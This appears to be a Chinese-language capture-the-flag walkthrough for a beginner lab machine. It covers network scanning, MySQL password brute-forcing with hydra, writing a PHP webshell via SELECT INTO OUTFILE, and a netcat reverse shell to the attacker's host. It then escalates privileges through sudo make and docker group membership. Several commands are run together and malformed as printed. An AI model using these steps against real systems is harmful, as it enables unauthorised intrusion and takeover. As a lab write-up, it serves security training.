目标：1个flag

级别：初级

1、通过arp-scan检测主机IP地址

arp-scan -l

2、通过nmap进行端口扫描

nmap -A -sS -sV -v -p- 192.168.1.167
查看开放21、22、25、80、3306、8008端口

3、WEB渗透测试

3.1 使用nikto和dirb进行探测网站80和8080端口没有发现有用信息，访问8080网页提示网站目录在/var/tmp

3.2 使用hydra进行mysql数据库爆破，得到密码为password

hydra -l root -P /usr/share/wordlists/rockyou.txt  192.168.1.167 mysql

3.3 登录mysql数据库，并根据提示的目录为/var/tmp,可以写入webshell

mysql -u root -ppassword -h 192.168.1.167select ("<?php system($_GET['cmd']);?>") into outfile '/var/tmp/cmd.php';

3.4 使用获取到的webshell，执行反弹连接

在kali中开启NC监听服务

nc -nlvp 4444

访问页面后获取反弹连接

http://192.168.1.167:8080/cmd.php?cmd=nc%20-e%20/bin/bash%20192.168.1.129%204444

3.5 使用python优化脚本，并查看用户目录文件获取第一个flag

python3 -c 'import pty;pty.spawn("/bin/bash")'cat /home/dusk/user.txt

3.6 查看www-data的sudo权限，dusk授权www-data有ping、make、sl权限

sudo -l

3.7 使用make进行提权，提权到用户为dusk

shell=/bin/shsudo -u dusk make -s --eval=$'x:\n\t-'"$shell"

4、系统提权

4.1 使用ID查看当前用户权限信息,也所属docker组

python3 -c 'import pty;pty.spawn("/bin/bash")'id

4.2 使用docker进行查看flag

docker run -it -v /root:/root daocloud.io/library/ubuntucd /rootcat root.txt
